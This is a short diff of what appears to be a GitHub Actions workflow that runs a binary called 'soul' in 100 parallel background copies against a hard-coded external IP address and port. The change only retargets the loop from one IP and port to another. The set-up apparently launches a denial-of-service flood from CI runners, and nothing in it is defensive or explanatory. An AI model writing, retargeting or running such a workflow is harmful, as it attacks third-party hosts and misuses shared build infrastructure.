@@ -9,6 +9,6 @@ jobs:
       - run: chmod +x soul
       - run: |
           for i in {1..100}; do
-            ./soul 20.235.10.172 11470 200 4000 &
+            ./soul 20.192.28.73 22086 200 4000 &
           done
           wait
